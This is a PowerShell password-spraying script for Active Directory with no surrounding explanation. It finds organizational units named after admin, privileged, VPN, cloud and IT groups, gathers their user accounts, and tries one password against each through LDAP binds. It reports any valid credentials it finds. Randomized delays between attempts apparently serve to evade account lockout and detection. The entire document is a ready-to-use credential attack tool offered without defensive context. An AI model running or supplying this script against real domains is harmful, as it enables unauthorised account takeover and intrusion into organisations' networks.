$Domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
Write-Host "Detected domain: $Domain" -ForegroundColor Cyan


$interestingKeywords = @("Admin", "Priv", "Service", "VPN", "Cloud", "Azure", "DevOps", "DB", "IT")


$ldapPath = "LDAP://$Domain"
$directoryEntry = New-Object DirectoryServices.DirectoryEntry($ldapPath)
$searcher = New-Object DirectoryServices.DirectorySearcher($directoryEntry)
$searcher.Filter = "(objectCategory=organizationalUnit)"
$searcher.PageSize = 1000


$OUBuckets = @{}


foreach ($result in $searcher.FindAll()) {
    $ouDN = $result.Properties["distinguishedname"] | Select-Object -First 1
    if ($interestingKeywords | Where-Object { $ouDN -match $_ }) {
        Write-Host "[+] Found interesting OU: $ouDN" -ForegroundColor Yellow

        $userSearcher = New-Object DirectoryServices.DirectorySearcher($directoryEntry)
        $userSearcher.Filter = "(&(objectCategory=person)(objectClass=user)(distinguishedName=*$ouDN))"
        $userSearcher.PageSize = 1000

        $users = @()
        foreach ($user in $userSearcher.FindAll()) {
            $userName = $user.Properties["samaccountname"] | Select-Object -First 1
            if ($userName) {
                $users += "$Domain\$userName"
            }
        }

        if ($users.Count -gt 0) {
            $OUBuckets[$ouDN] = $users
        }
    }
}


Write-Host "`nOUs selected for spraying:" -ForegroundColor Green
$OUBuckets.Keys | ForEach-Object { Write-Host " $_" }


$passwordToSpray = Read-Host -Prompt "Enter password to spray"


Write-Host "`nStarting password spray..." -ForegroundColor Cyan
foreach ($OU in $OUBuckets.Keys) {
    foreach ($user in $OUBuckets[$OU]) {
        try {
            $ldapTry = New-Object DirectoryServices.DirectoryEntry("LDAP://$Domain", $user, $passwordToSpray)
            $null = $ldapTry.NativeObject
            Write-Host "[+] Valid: $user / $passwordToSpray" -ForegroundColor Green
        }
        catch {
            Write-Host "[-] Invalid: $user" -ForegroundColor DarkGray
        }


        Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 25)
    }


    Write-Host "[*] Finished OU: $OU" -ForegroundColor Cyan
    Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 60)
}
